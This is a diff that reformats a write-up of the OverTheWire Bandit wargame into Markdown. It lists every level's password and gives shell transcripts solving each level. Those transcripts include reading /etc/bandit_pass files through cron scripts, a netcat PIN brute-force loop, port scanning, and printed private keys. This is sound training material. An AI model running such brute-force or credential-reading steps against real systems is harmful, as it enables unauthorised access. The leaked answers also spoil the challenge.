@@ -1,25 +1,70 @@
-username	-	password
-========================================
-bandit0		-	bandit0
 
-----------------------------------------
-bandit1		-	boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+# Bandit - wargame
 
+### http://overthewire.org/wargames/bandit/
+
+===
+
+| username | password |
+|---|---|
+|bandit0 | bandit0|
+| bandit1 | boJ9jbbUNNfktd78OOpsqOltutMc3MY1 |
+| bandit2 | CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 |
+| bandit3 | UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK |
+| bandit4 | pIwrPrtPN36QITSp3EQaw936yaFoFgAB |
+| bandit5 | koReBOKuIDDepwhWk7jZC0RTdopnAYKh |
+| bandit6 | DXjZPULLxYr17uwoI01bNLQbtFemEgo7 |
+| bandit7 | HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs |
+| bandit8 | cvX2JJa4CFALtqS87jk27qwqGhBM9plV |
+| bandit9 | UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR |
+| bandit10 | truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk |
+| bandit11 | IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR |
+| bandit12 | 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu |
+| bandit13 | 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL |
+| bandit14 | 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e |
+| bandit15 | BfMYroe26WYalil77FoDi9qh59eK5xNr |
+| bandit16 | cluFn7wTiGryunymYOu4RcffSxQluehd |
+| bandit17 | private key ^ (bandit17.key) |
+| bandit18 | kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd |
+| bandit19 | IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x |
+| bandit20 | GbKksEFF4yrVs6il55v6gwY5aVje5f0j |
+| bandit21 | gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr |
+| bandit22 | Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI |
+| bandit23 | jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n |
+| bandit24 | UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ |
+| bandit25 | uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG |
+| bandit26 | 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z |
+
+===
+
+#### level 1
+
+```
 bandit1@melinda:~$ cat ./-
 CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
-----------------------------------------
-bandit2		-	CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+```
+===
 
+#### level 2
+
+```
 bandit2@melinda:~$ cat spaces\ in\ this\ filename 
 UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
-----------------------------------------
-bandit3		-	UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+```
+===
 
+#### level 3
+
+```
 bandit3@melinda:~$ cat inhere/.hidden 
 pIwrPrtPN36QITSp3EQaw936yaFoFgAB
-----------------------------------------
-bandit4		-	pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+```
 
+===
+
+#### level 4
+
+```
 bandit4@melinda:~$ find inhere/ -type f -exec file {} \;
 inhere/-file08: data
 inhere/-file05: data
@@ -33,90 +78,125 @@ inhere/-file09: data
 inhere/-file02: data
 bandit4@melinda:~$ cat inhere/-file07 
 koReBOKuIDDepwhWk7jZC0RTdopnAYKh
-----------------------------------------
-bandit5		-	koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+```
 
+===
+
+#### level 5
+
+```
 bandit5@melinda:~$ find inhere/ -size 1033c -exec cat {} \;
 DXjZPULLxYr17uwoI01bNLQbtFemEgo7
-----------------------------------------
-bandit6		-	DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+```
 
+===
+
+#### level 6
+
+```
 bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/dev/null
 HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
-----------------------------------------
-bandit7		-	HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+```
 
+===
+
+#### level 7
+
+```
 bandit7@melinda:~$ grep millionth data.txt 
 millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
-----------------------------------------
-bandit8		-	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+```
 
+===
+
+#### level 8
+
+```
 bandit8@melinda:~$ sort data.txt |uniq -c|sort -nr|tail -1
       1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
-----------------------------------------
-bandit9		-	UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+```
 
+===
+
+#### level 9
+
+```
 bandit9@melinda:~$ strings data.txt |egrep '^=+'
 ========== password
 ========== ism
 ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
-----------------------------------------
-bandit10	-	truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+```
 
+===
+
+#### level 10
+
+```
 bandit10@melinda:~$ base64 -d data.txt 
 The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
-----------------------------------------
-bandit11	-	IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+```
 
+===
+
+#### level 11
+
+```
 bandit11@melinda:~$ cat data.txt|tr a-zA-Z n-za-mN-ZA-M
 The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
-----------------------------------------
-bandit12	-	5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+```
 
+===
+
+#### level 12
+
+```
 bandit12@melinda:~$ mkdir /tmp/pero
 bandit12@melinda:~$ xxd -r data.txt > /tmp/pero/data.gz
 bandit12@melinda:~$ file /tmp/pero/data.gz 
 /tmp/pero/data.gz: gzip compressed data, was "data2.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
 bandit12@melinda:~$ mv /tmp/pero/data.gz /tmp/pero/data2.bin.gz
-bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz                                                                                            
-bandit12@melinda:~$ file /tmp/pero/data2.bin                                                                                                 
+bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz
+bandit12@melinda:~$ file /tmp/pero/data2.bin                
 /tmp/pero/data2.bin: bzip2 compressed data, block size = 900k
 bandit12@melinda:~$ bunzip2 /tmp/pero/data2.bin
 bunzip2: Can't guess original name for /tmp/pero/data2.bin -- using /tmp/pero/data2.bin.out
 bandit12@melinda:~$ file /tmp/pero/data2.bin.out
 /tmp/pero/data2.bin.out: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
-bandit12@melinda:~$ mv /tmp/pero/data2.bin /tmp/pero/data2.bin.gz                                                                                                                              
-bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz
+bandit12@melinda:~$ mv /tmp/pero/data2.bin /tmp/pero/data2.bin.gz                                                             bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz
 bandit12@melinda:~$ file /tmp/pero/data2.bin
 /tmp/pero/data2.bin: POSIX tar archive (GNU)
-bandit12@melinda:~$ tar tvf /tmp/pero/data2.bin                                                                                                                                                
+bandit12@melinda:~$ tar tvf /tmp/pero/data2.bin
 -rw-r--r-- root/root     10240 2014-11-14 10:32 data5.bin
 bandit12@melinda:~$ tar xf /tmp/pero/data2.bin -C /tmp/pero
 bandit12@melinda:~$ file /tmp/pero/data5.bin
 /tmp/pero/data5.bin: POSIX tar archive (GNU)
-bandit12@melinda:~$ tar tf /tmp/pero/data5.bin                                                                                                                                                 
+bandit12@melinda:~$ tar tf /tmp/pero/data5.bin
 data6.bin
-bandit12@melinda:~$ tar xf /tmp/pero/data5.bin -C /tmp/pero                                                                                                                                    
+bandit12@melinda:~$ tar xf /tmp/pero/data5.bin -C /tmp/pero
 bandit12@melinda:~$ file /tmp/pero/data6.bin 
 /tmp/pero/data6.bin: bzip2 compressed data, block size = 900k
-bandit12@melinda:~$ bunzip2 /tmp/pero/data6.bin                                                                                                                                                
+bandit12@melinda:~$ bunzip2 /tmp/pero/data6.bin
 bunzip2: Can't guess original name for /tmp/pero/data6.bin -- using /tmp/pero/data6.bin.out
 bandit12@melinda:~$ file /tmp/pero/data6.bin.out
 /tmp/pero/data6.bin.out: POSIX tar archive (GNU)
 bandit12@melinda:~$ tar tf /tmp/pero/data6.bin.out
 data8.bin
-bandit12@melinda:~$ tar xf /tmp/pero/data6.bin.out -C /tmp/pero                                                                                                                                
+bandit12@melinda:~$ tar xf /tmp/pero/data6.bin.out -C /tmp/pero                  
 bandit12@melinda:~$ file /tmp/pero/data8.bin
 /tmp/pero/data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
 bandit12@melinda:~$ mv /tmp/pero/data8.bin /tmp/pero/data9.bin.gz 
 bandit12@melinda:~$ gunzip /tmp/pero/data9.bin.gz
-bandit12@melinda:~$ file /tmp/pero/data9.bin                                                                                                                                                   
+bandit12@melinda:~$ file /tmp/pero/data9.bin
 /tmp/pero/data9.bin: ASCII text
-bandit12@melinda:~$ cat /tmp/pero/data9.bin                                                                                                                                                    
+bandit12@melinda:~$ cat /tmp/pero/data9.bin
 The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
-----------------------------------------
-bandit13	-	8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+```
 
+===
+
+#### level 13
+
+```
 bandit13@melinda:~$ cat sshkey.private 
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
@@ -154,15 +234,23 @@ Are you sure you want to continue connecting (yes/no)? yes
 ...
 bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
-----------------------------------------
-bandit14	-	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+```
 
+===
+
+#### level 14
+
+```
 bandit14@melinda:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e|nc localhost 30000
 Correct!
 BfMYroe26WYalil77FoDi9qh59eK5xNr
-----------------------------------------
-bandit15	-	BfMYroe26WYalil77FoDi9qh59eK5xNr
+```
 
+===
+
+#### level 15
+
+```
 bandit15@melinda:~$ echo BfMYroe26WYalil77FoDi9qh59eK5xNr|openssl s_client -connect localhost:30001 -quiet
 depth=0 CN = li190-250.members.linode.com
 verify error:num=18:self signed certificate
@@ -173,9 +261,13 @@ Correct!
 cluFn7wTiGryunymYOu4RcffSxQluehd
 
 read:errno=0
-----------------------------------------
-bandit16	-	cluFn7wTiGryunymYOu4RcffSxQluehd
+```
 
+===
+
+#### level 16
+
+```
 bandit16@melinda:~$ nmap localhost -p31000-32000|awk -F\/ '/tcp open/{system("echo "$1"; echo cluFn7wTiGryunymYOu4RcffSxQluehd|nc localhost "$1)}'
 31046
 cluFn7wTiGryunymYOu4RcffSxQluehd
@@ -189,8 +281,7 @@ ERROR
 140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:
 31960
 cluFn7wTiGryunymYOu4RcffSxQluehd
-
-bandit16@melinda:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd|openssl s_client -quiet -connect localhost:31790                                                                    
+bandit16@melinda:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd|openssl s_client -quiet -connect localhost:31790
 depth=0 CN = li190-250.members.linode.com
 verify error:num=18:self signed certificate
 verify return:1
@@ -226,17 +317,26 @@ vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
 -----END RSA PRIVATE KEY-----
 
 read:errno=0
-----------------------------------------
-bandit17	-	private key ^ (bandit17.key)
 
+```
+
+===
+
+#### level 17
+
+```
 bandit17@melinda:~$ diff passwords.new passwords.old 
 42c42
 < kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 ---
 > BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
-----------------------------------------
-bandit18	-	kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+```
 
+===
+
+#### level 18
+
+```
 pja@red0:~/tmp/bandit$ ssh bandit18@bandit.labs.overthewire.org /bin/bash --norc
 bandit18@bandit.labs.overthewire.org's password: 
 ls -al
@@ -249,28 +349,39 @@ drwxr-xr-x 167 root     root     4096 Jul  9  2015 ..
 -rw-r-----   1 bandit19 bandit18   33 Nov 14  2014 readme
 cat readme
 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
-----------------------------------------
-bandit19	-	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+```
 
+===
+
+#### level 19
+
+```
 bandit19@melinda:~$ ./bandit20-do id                  
 uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11020(bandit20),11019(bandit19)
 bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
-----------------------------------------
-bandit20	-	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
 
+===
+
+#### level 20
+
+```
 TERMINAL #1:
 bandit20@melinda:~$ nc -4 -l -n -p 12345
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j  <- c/p and send
 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
-
 TERMINAL #2:
 bandit20@melinda:~$ ./suconnect 12345
 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 Password matches, sending next password
-----------------------------------------
-bandit21	-	gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
 
+===
+
+#### level 21
+
+```
 bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
 * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
@@ -279,9 +390,13 @@ chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 bandit21@melinda:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
-----------------------------------------
-bandit22	-	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
 
+===
+
+#### level 22
+
+```
 bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23 
 * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
 bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh 
@@ -293,13 +408,18 @@ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 
 cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
 bandit22@melinda:/etc/cron.d$ echo I am user bandit23|md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
 bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
-----------------------------------------
-bandit23	-	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
 
+===
+
+#### level 23
+
+```
 bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
@@ -332,15 +452,23 @@ drwxrwx-wt 1 root     root     8036352 Jun 20 07:08 ..
 -rw-rw-r-- 1 bandit24 bandit24      33 Jun 20 07:08 pass
 bandit23@melinda:~$ cat /tmp/b24/pass                                                              
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-----------------------------------------
-bandit24	-	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
 
+===
+
+#### level 24
+
+```
 bandit24@melinda:~$ for i in {0000..9999}; do R=`echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"|nc localhost 30002`; if [[ ! $R =~ Wrong ]]; then echo $i; echo $R; break; fi; done
 5669
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.
-----------------------------------------
-bandit25	-	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
 
+===
+
+#### level 25
+
+```
 bandit25@melinda:~$ ls -al
 total 32
 drwxr-xr-x   2 root     root     4096 Nov 16  2014 .
@@ -352,7 +480,7 @@ drwxr-xr-x 167 root     root     4096 Jul  9  2015 ..
 -rw-r--r--   1 root     root      675 Apr  9  2014 .profile
 -r--------   1 bandit25 bandit25 1679 Nov 16  2014 bandit26.sshkey
 bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
-
+...
 bandit25@melinda:~$ stty rows 3 (or simply resize your xterm)
 bandit25@melinda:~$ ssh -t -i ./bandit26.sshkey bandit26@localhost
 
@@ -363,6 +491,8 @@ bandit25@melinda:~$ ssh -t -i ./bandit26.sshkey bandit26@localhost
 * PRESS v to enter vi *
 
 Resize the terminal back and edit files at will as user bandit26 ;)
+```
 
-----------------------------------------
-bandit26	-	5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+===
+
+
